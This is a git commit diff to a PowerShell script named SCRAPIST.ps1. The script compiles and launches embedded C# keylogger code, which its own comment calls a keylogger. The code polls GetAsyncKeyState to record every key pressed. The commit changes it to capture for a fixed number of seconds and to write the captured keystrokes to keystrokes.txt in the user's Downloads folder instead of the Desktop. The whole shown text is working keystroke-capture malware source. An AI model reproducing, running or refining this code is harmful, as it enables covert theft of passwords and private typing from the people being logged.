1b52d95b733ff60b8c7fc508d8f5986be719cf91
toadletime <fhwy5@k12albemarle.org>
2025-02-25 00:36:31 -0500

    Update SCRAPIST.ps1

--- SCRAPIST.ps1
+++ SCRAPIST.ps1
@@ -7,31 +7,31 @@ using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
+using System.Threading;
 public class Logger {
     [DllImport("user32.dll")]
     public static extern short GetAsyncKeyState(int vKey);
 
-    public static void Start(ref System.Collections.Generic.List<string> keystrokes) {
-        while (true) {
-            System.Threading.Thread.Sleep(10);
+    public static void Start(ref System.Collections.Generic.List<string> keystrokes, int durationInSeconds) {
+        DateTime endTime = DateTime.Now.AddSeconds(durationInSeconds);
+        while (DateTime.Now < endTime) {
+            Thread.Sleep(10);
             for (int i = 8; i <= 190; i++) {
                 if (GetAsyncKeyState(i) == -32767) {
                     string key = ((Keys)i).ToString();
                     keystrokes.Add(key);
-                    if (key == "Enter") {
-                        // Save the keystrokes to the Desktop
-                        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-                        string logFile = Path.Combine(desktopPath, "keystrokes.txt");
-                        File.WriteAllLines(logFile, keystrokes);
-                        keystrokes.Clear(); // Reset the keystrokes after saving
-                    }
                 }
             }
         }
+        
+        // Save the keystrokes to the Downloads folder
+        string downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
+        string logFile = Path.Combine(downloadsPath, "keystrokes.txt");
+        File.WriteAllLines(logFile, keystrokes);
     }
 }
 '@
 
 # Compile and start the keylogger
 Add-Type -TypeDefinition $signature -Language CSharp
-Start-Job -ScriptBlock { [Logger]::Start($using:keystrokes) }
+Start-Job -ScriptBlock { [Logger]::Start($using:keystrokes, 10) }
